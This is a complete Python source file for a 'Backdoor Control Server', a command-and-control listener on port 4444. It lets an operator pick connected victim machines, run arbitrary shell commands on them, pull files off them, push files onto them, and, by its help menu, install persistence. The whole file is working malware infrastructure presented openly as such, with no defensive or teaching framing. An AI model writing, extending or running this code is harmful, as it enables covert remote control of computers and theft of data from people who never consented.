import socket
import threading
import os
import sys
import time
from datetime import datetime

# Text colors for the terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class BackdoorServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.clients = {}  # Dictionary to store client connections {addr: (socket, info)}
        self.current_client = None
        self.prompt = f"{Colors.BLUE}[*]{Colors.ENDC} C2> "
        self.running = False
        self.command_history = []
        
    def start(self):
        """Start the server"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            print(f"{Colors.GREEN}[+]{Colors.ENDC} Server started on {self.host}:{self.port}")
            print(f"{Colors.GREEN}[+]{Colors.ENDC} Waiting for incoming connections...\n")
            
            # Start a thread to handle new connections
            listener_thread = threading.Thread(target=self._accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            # Main loop for command input
            self._command_loop()
            
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error starting server: {str(e)}")
            self.stop()
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, client_address = self.socket.accept()
                
                # Receive system info from client
                system_info = client_socket.recv(4096).decode()
                
                # Store the connection
                addr_str = f"{client_address[0]}:{client_address[1]}"
                self.clients[addr_str] = (client_socket, system_info)
                
                print(f"\n{Colors.GREEN}[+]{Colors.ENDC} New connection from {addr_str}")
                print(f"{Colors.BLUE}[*]{Colors.ENDC} System Info:\n{system_info}")
                print(self.prompt, end="", flush=True)
                
                # Start a thread to monitor this client
                monitor_thread = threading.Thread(target=self._monitor_client, 
                                              args=(client_socket, addr_str))
                monitor_thread.daemon = True
                monitor_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} Error accepting connection: {str(e)}")
                    time.sleep(1)
    
    def _monitor_client(self, client_socket, addr_str):
        """Monitor client for disconnection"""
        while self.running:
            try:
                # Try sending a keep-alive packet
                if client_socket in [c[0] for c in self.clients.values()]:
                    # We're just checking if the socket is still valid
                    # The actual communication happens in the command loop
                    time.sleep(30)
            except:
                if addr_str in self.clients:
                    print(f"\n{Colors.FAIL}[-]{Colors.ENDC} Client {addr_str} disconnected")
                    del self.clients[addr_str]
                    if self.current_client == addr_str:
                        self.current_client = None
                    print(self.prompt, end="", flush=True)
                break
    
    def _command_loop(self):
        """Main command loop for the server"""
        while self.running:
            try:
                command = input(self.prompt)
                self.command_history.append(command)
                
                if not command:
                    continue
                
                if command.lower() in ["exit", "quit"]:
                    self.stop()
                    break
                
                elif command.lower() == "help":
                    self._show_help()
                
                elif command.lower() == "list":
                    self._list_clients()
                
                elif command.lower().startswith("connect "):
                    self._connect_to_client(command[8:])
                
                elif command.lower() == "disconnect":
                    self.current_client = None
                    print(f"{Colors.BLUE}[*]{Colors.ENDC} Disconnected from current session")
                
                elif command.lower() == "clear":
                    os.system("cls" if os.name == "nt" else "clear")
                
                elif command.lower() == "history":
                    for i, cmd in enumerate(self.command_history):
                        print(f"{i}: {cmd}")
                
                elif command.lower().startswith("download "):
                    self._download_file(command[9:])
                
                elif command.lower().startswith("upload "):
                    self._upload_file(command[7:])
                
                elif self.current_client:
                    self._send_command_to_client(command)
                
                else:
                    print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected. Use 'connect <id>' first or 'list' to see available clients")
            
            except KeyboardInterrupt:
                print("\n")
                ans = input(f"{Colors.WARNING}[!]{Colors.ENDC} Do you want to exit? (y/n): ").lower()
                if ans == "y":
                    self.stop()
                    break
            
            except Exception as e:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Error: {str(e)}")
    
    def _show_help(self):
        """Show help menu"""
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.ENDC}
{Colors.GREEN}help{Colors.ENDC}                Show this help menu
{Colors.GREEN}list{Colors.ENDC}                List all connected clients
{Colors.GREEN}connect <id>{Colors.ENDC}        Connect to a specific client
{Colors.GREEN}disconnect{Colors.ENDC}          Disconnect from the current session
{Colors.GREEN}clear{Colors.ENDC}               Clear the screen
{Colors.GREEN}history{Colors.ENDC}             Show command history
{Colors.GREEN}download <file>{Colors.ENDC}     Download a file from the client
{Colors.GREEN}upload <file>{Colors.ENDC}       Upload a file to the client
{Colors.GREEN}sysinfo{Colors.ENDC}             Get system information
{Colors.GREEN}persist{Colors.ENDC}             Install persistence mechanism
{Colors.GREEN}<command>{Colors.ENDC}           Execute a shell command on the client
{Colors.GREEN}exit/quit{Colors.ENDC}           Exit the C2 server
"""
        print(help_text)
    
    def _list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No clients connected")
            return
        
        print(f"\n{Colors.BOLD}Connected Clients:{Colors.ENDC}")
        for i, (addr, (_, info)) in enumerate(self.clients.items()):
            # Extract and display relevant info
            for line in info.split('\n'):
                if any(k in line for k in ['System:', 'Node:', 'User:']):
                    info_line = line.strip()
                    if 'System:' in line:
                        system = info_line
                    if 'User:' in line:
                        user = info_line
            
            current = f" {Colors.GREEN}(current){Colors.ENDC}" if addr == self.current_client else ""
            print(f"[{i}] {addr}{current}")
            try:
                print(f"    {system} | {user}")
            except:
                print(f"    Info not available")
        print()
    
    def _connect_to_client(self, client_id):
        """Connect to a specific client"""
        try:
            if not self.clients:
                print(f"{Colors.WARNING}[!]{Colors.ENDC} No clients connected")
                return
            
            client_id = client_id.strip()
            
            # Check if client_id is a direct IP:port address
            if client_id in self.clients:
                self.current_client = client_id
                print(f"{Colors.GREEN}[+]{Colors.ENDC} Connected to {client_id}")
                return
            
            # Otherwise treat as an index number
            try:
                index = int(client_id)
                if 0 <= index < len(self.clients):
                    self.current_client = list(self.clients.keys())[index]
                    print(f"{Colors.GREEN}[+]{Colors.ENDC} Connected to {self.current_client}")
                else:
                    print(f"{Colors.FAIL}[-]{Colors.ENDC} Invalid client index")
            except ValueError:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Invalid client identifier")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error connecting to client: {str(e)}")
    
    def _send_command_to_client(self, command):
        """Send a command to the current client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        if self.current_client not in self.clients:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Client disconnected")
            self.current_client = None
            return
        
        try:
            client_socket = self.clients[self.current_client][0]
            client_socket.send(command.encode())
            
            response = client_socket.recv(4096).decode()
            print(response)
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error communicating with client: {str(e)}")
            # Client might have disconnected
            if self.current_client in self.clients:
                del self.clients[self.current_client]
            self.current_client = None
    
    def _download_file(self, file_path):
        """Download a file from the client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        try:
            # Send the download command
            client_socket = self.clients[self.current_client][0]
            client_socket.send(f"download {file_path}".encode())
            
            # Receive the file info response
            response = client_socket.recv(4096).decode()
            
            if response.startswith("Error"):
                print(f"{Colors.FAIL}[-]{Colors.ENDC} {response}")
                return
            
            if response.startswith("FILE:"):
                # Parse file info
                _, filename, size = response.split(":", 2)
                size = int(size)
                
                print(f"{Colors.BLUE}[*]{Colors.ENDC} Downloading: {filename} ({size} bytes)")
                
                # Send ready signal
                client_socket.send(b"READY")
                
                # Receive file data
                file_data = b""
                bytes_received = 0
                
                while bytes_received < size:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file_data += data
                    bytes_received += len(data)
                    
                    # Print progress
                    progress = int((bytes_received / size) * 20)
                    bar = "[" + "=" * progress + " " * (20 - progress) + "]"
                    percent = int((bytes_received / size) * 100)
                    print(f"\r{Colors.BLUE}[*]{Colors.ENDC} {bar} {percent}%", end="", flush=True)
                
                # Save the file
                os.makedirs("downloads", exist_ok=True)
                save_path = os.path.join("downloads", filename)
                
                with open(save_path, "wb") as f:
                    f.write(file_data)
                
                print(f"\n{Colors.GREEN}[+]{Colors.ENDC} File saved to {save_path}")
            
            else:
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Unexpected response: {response}")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error downloading file: {str(e)}")
    
    def _upload_file(self, file_path):
        """Upload a file to the client"""
        if not self.current_client:
            print(f"{Colors.WARNING}[!]{Colors.ENDC} No client selected")
            return
        
        try:
            if not os.path.exists(file_path):
                print(f"{Colors.FAIL}[-]{Colors.ENDC} File not found: {file_path}")
                return
            
            # Get the file data
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            file_size = len(file_data)
            filename = os.path.basename(file_path)
            
            # Send upload command
            client_socket = self.clients[self.current_client][0]
            client_socket.send(f"upload {filename}".encode())
            
            # Wait for client to be ready
            response = client_socket.recv(4096).decode()
            if response != "READY":
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Client not ready: {response}")
                return
            
            # Send file size
            client_socket.send(str(file_size).encode())
            
            # Wait for acknowledgment
            response = client_socket.recv(4096).decode()
            if response != "SIZE_RECEIVED":
                print(f"{Colors.FAIL}[-]{Colors.ENDC} Error sending file size: {response}")
                return
            
            # Send file data
            client_socket.sendall(file_data)
            
            # Get confirmation
            response = client_socket.recv(4096).decode()
            print(f"{Colors.GREEN}[+]{Colors.ENDC} {response}")
        
        except Exception as e:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Error uploading file: {str(e)}")
    
    def stop(self):
        """Stop the server"""
        self.running = False
        
        # Close all client connections
        for addr, (client_socket, _) in self.clients.items():
            try:
                client_socket.close()
            except:
                pass
        
        self.clients.clear()
        
        # Close the server socket
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print(f"{Colors.GREEN}[+]{Colors.ENDC} Server stopped")


if __name__ == "__main__":
    print(f"""
{Colors.BOLD}{Colors.HEADER}================================{Colors.ENDC}
{Colors.BOLD}{Colors.HEADER}    Backdoor Control Server    {Colors.ENDC}
{Colors.BOLD}{Colors.HEADER}================================{Colors.ENDC}
""")
    
    # Parse command line arguments for custom port
    port = 4444
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except:
            print(f"{Colors.FAIL}[-]{Colors.ENDC} Invalid port number, using default 4444")
    
    # Start the server
    server = BackdoorServer(port=port)
    server.start() 